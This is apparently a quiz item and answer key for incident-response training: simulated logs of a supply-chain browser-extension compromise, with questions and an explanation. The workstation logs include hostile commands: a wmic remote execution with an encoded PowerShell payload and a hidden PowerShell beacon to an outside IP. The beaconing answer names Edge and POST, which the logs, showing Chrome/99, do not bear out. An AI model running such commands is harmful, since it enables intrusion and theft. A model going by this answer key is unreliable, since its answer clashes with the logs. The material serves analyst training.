scenarios.push({
        id: "ir-scenario-2026-supply-chain-wmi",
        title: "Operation Poisoned Update",
        description: "Unusual outbound web gateway requests matching outdated User-Agent signatures observed alongside lateral WMI execution.",
        logs: {
            proxy: [
                "2026-05-29T09:02:14Z - IP: 192.168.10.121 - URL: https://chrome.google.com/webstore - Action: Allowed - Category: Software/Updates - Bytes: 12500",
                "2026-05-29T09:05:45Z - IP: 192.168.10.122 - URL: https://github.com/pipelines/build - Action: Allowed - Category: IT/Development - Bytes: 45092",
                "2026-05-29T09:12:40Z - IP: 192.168.10.125 - URL: http://soft-update-portal.net/extension/update.json - Action: Allowed - Category: Uncategorized - Bytes: 512",
                "2026-05-29T09:15:30Z - IP: 192.168.10.121 - URL: https://clients2.google.com/service/update2 - Action: Allowed - Category: Software/Updates - Bytes: 3410",
                "2026-05-29T09:18:05Z - IP: 192.168.10.125 - URL: http://soft-update-portal.net/bin/pdf_helper_service.exe - Action: Allowed - Category: Uncategorized - Bytes: 4520000",
                "2026-05-29T09:20:00Z - IP: 192.168.10.125 - URL: http://185.190.140.12/api/v1/telemetry - Action: Allowed - UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/99.0.4844.84 - Bytes: 1042",
                "2026-05-29T09:25:00Z - IP: 192.168.10.125 - URL: http://185.190.140.12/api/v1/telemetry - Action: Allowed - UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/99.0.4844.84 - Bytes: 1042",
                "2026-05-29T09:30:00Z - IP: 192.168.10.125 - URL: http://185.190.140.12/api/v1/telemetry - Action: Allowed - UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/99.0.4844.84 - Bytes: 1042",
                "2026-05-29T09:35:12Z - IP: 192.168.10.122 - URL: https://stackoverflow.com - Action: Allowed - Category: IT/Development - Bytes: 8800",
                "2026-05-29T09:48:20Z - IP: 192.168.10.125 - Proto: TCP/135 (DCE/RPC) - Dest: 192.168.10.128 - Action: Allowed - Internal Traffic",
                "2026-05-29T09:48:22Z - IP: 192.168.10.125 - Proto: TCP/445 (SMB-WMI) - Dest: 192.168.10.128 - Action: Allowed - Internal Traffic",
                "2026-05-29T09:55:00Z - IP: 192.168.10.128 - URL: http://185.190.140.12/api/v1/telemetry - Action: Allowed - UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/99.0.4844.84 - Bytes: 1250",
                "2026-05-29T10:00:00Z - IP: 192.168.10.128 - URL: http://185.190.140.12/api/v1/telemetry - Action: Allowed - UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/99.0.4844.84 - Bytes: 1250"
            ],
            email: [
                "2026-05-29T09:00:10Z - Inbound - From: notifications@slack.com - To: mjenkins@company.com - Subject: Direct Message Notification - Status: Delivered",
                "2026-05-29T09:10:00Z - Inbound - From: newsletter@techtrends.com - To: jdoe@company.com - Subject: Weekly Technology Brief - Status: Delivered"
            ],
            file_server: [
                "2026-05-29T09:14:22Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.121 - User: COMPANY\\mjenkins",
                "2026-05-29T09:38:15Z - Object Accessed: \\\\FILE-SRV-01\\HR\\Active_Employees_PII.csv - Accesses: ReadData - Source IP: 192.168.10.125 - User: COMPANY\\dom-admin",
                "2026-05-29T09:42:00Z - Share Name: \\\\FILE-SRV-01\\DevShare - Access Request: Allowed - Source IP: 192.168.10.122 - User: COMPANY\\kbaker"
            ],
            workstations: [
                '2026-05-29T08:52:10Z - WKSTN-23 (192.168.10.123) - Command executed: Powershell.exe -Command "1..254 | % {test-connection 192.168.10.$_ -count 1 -quiet}" - Note: Benign internal inventory scan',
                "2026-05-29T09:12:40Z - WKSTN-25 (192.168.10.125) - EventID: 4688 - Process Created: explorer.exe spawned chrome.exe",
                "2026-05-29T09:18:05Z - WKSTN-25 (192.168.10.125) - EventID: 4688 - Process Created: chrome.exe spawned C:\\Windows\\Temp\\pdf_helper_service.exe",
                "2026-05-29T09:35:10Z - WKSTN-25 (192.168.10.125) - EventID: 4688 - Process Created: C:\\Windows\\Temp\\pdf_helper_service.exe spawned lsass.exe (Access Granted: 0x1410)",
                '2026-05-29T09:48:20Z - WKSTN-25 (192.168.10.125) - EventID: 4688 - Process Created: pdf_helper_service.exe spawned wmic.exe /node:192.168.10.128 process call create "powershell.exe -enc SQBFAFgAK..."',
                '2026-05-29T09:55:00Z - WKSTN-28 (192.168.10.128) - EventID: 4688 - Process Created: WmiPrvSE.exe spawned powershell.exe -WindowStyle Hidden -Command "[System.Net.HttpWebRequest]::Create(\'http://185.190.140.12/...\').GetResponse()"'
            ],
            auth_logs: [
                "2026-05-29T08:45:00Z - WKSTN-23 (192.168.10.123) - EventID: 4624 - Successful Logon - User: COMPANY\\tcollins - Logon Type: 2 (Interactive)",
                "2026-05-29T09:00:15Z - WKSTN-21 (192.168.10.121) - EventID: 4624 - Successful Logon - User: COMPANY\\mjenkins - Logon Type: 2 (Interactive)",
                "2026-05-29T09:01:22Z - IdP_Auth - User: jdoe@company.com - App: O365 Portal - AuthMethod: Password - Status: Success - Agent: Chrome Browser (Windows)",
                "2026-05-29T09:05:00Z - WKSTN-22 (192.168.10.122) - EventID: 4624 - Successful Logon - User: COMPANY\\kbaker - Logon Type: 2 (Interactive)",
                "2026-05-29T09:12:35Z - WKSTN-25 (192.168.10.125) - EventID: 4624 - Successful Logon - User: COMPANY\\jdoe - Logon Type: 2 (Interactive)",
                "2026-05-29T09:48:22Z - WKSTN-28 (192.168.10.128) - EventID: 4624 - Successful Network Logon - Source IP: 192.168.10.125 - User: COMPANY\\dom-admin - Logon Type: 3 (Network via WMI)"
            ]
        },
        questions: {
            vector: {
                label: "What was the initial entry mechanism (attack vector) used to breach the environment?",
                type: "select",
                options: [
                    "Unauthenticated Edge Gateway VPN exploitation",
                    "Social Engineering Phishing Link click",
                    "Compromised Browser Extension (Supply Chain Compromise)",
                    "Drive-By Download on a compromised industry forum"
                ],
                correct: "Compromised Browser Extension (Supply Chain Compromise)"
            },
            origin: {
                label: "Identify the endpoint system where the initial malicious payload was executed (Patient Zero):",
                type: "select",
                options: [
                    "WKSTN-21",
                    "WKSTN-22",
                    "WKSTN-25",
                    "WKSTN-28"
                ],
                correct: "WKSTN-25"
            },
            count: {
                label: "How many corporate workstations show telemetry confirming active host infection and ongoing C2 exfiltration?",
                type: "number",
                correct: 2
            },
            beaconing: {
                label: "What is the primary indicator used to identify malicious web gateway requests against benign traffic?",
                type: "select",
                options: [
                    "High-payload ICMP Echo Requests sent to an internal DNS server",
                    "Outbound HTTP POST requests mimicking Edge browser headers with an outdated User-Agent",
                    "High-frequency DNS TXT record requests to lookalike external subdomains",
                    "Direct unauthorized SSH file transfers over TCP Port 22"
                ],
                correct: "Outbound HTTP POST requests mimicking Edge browser headers with an outdated User-Agent"
            },
            lateral_movement: {
                label: "Which protocol/service was leveraged by the threat actor to execute remote commands laterally?",
                type: "select",
                options: [
                    "Windows Remote Management (WinRM) over TCP 5985",
                    "Remote Desktop Protocol (RDP) over TCP 3389",
                    "Server Message Block (SMB) administrative shared folders",
                    "Windows Management Instrumentation (WMI) over TCP 135/445"
                ],
                correct: "Windows Management Instrumentation (WMI) over TCP 135/445"
            }
        },
        principles: ["Lateral Movement", "Beaconing / Command & Control", "Obfuscation / Encryption", "Privilege Escalation"],
        explanation: "At 09:12:40Z, a compromised open-source browser extension updated inside the Google Chrome browser context of user 'jdoe' on WKSTN-25. At 09:18:05Z, this extension spawned 'pdf_helper_service.exe', establishing standard HTTP POST beaconing sequences to 185.190.140.12. To blend in, these requests utilized normal HTTP formatting, but were distinguishable by an outdated Chrome/99 User-Agent string. The attacker dumped credentials from LSASS and successfully hijacked the active 'dom-admin' session. At 09:48:20Z, the attacker used 'wmic.exe' to execute a lateral remote invocation sweep on WKSTN-28 over WMI ports (TCP 135/445), dropping an obfuscated PowerShell agent that initiated a secondary outbound beacon. Benign administrative activities, such as helpdesk personnel 'tcollins' executing a routine network inventory search via loop commands, were deliberately interspersed to challenge the analyst's event correlation."
    });
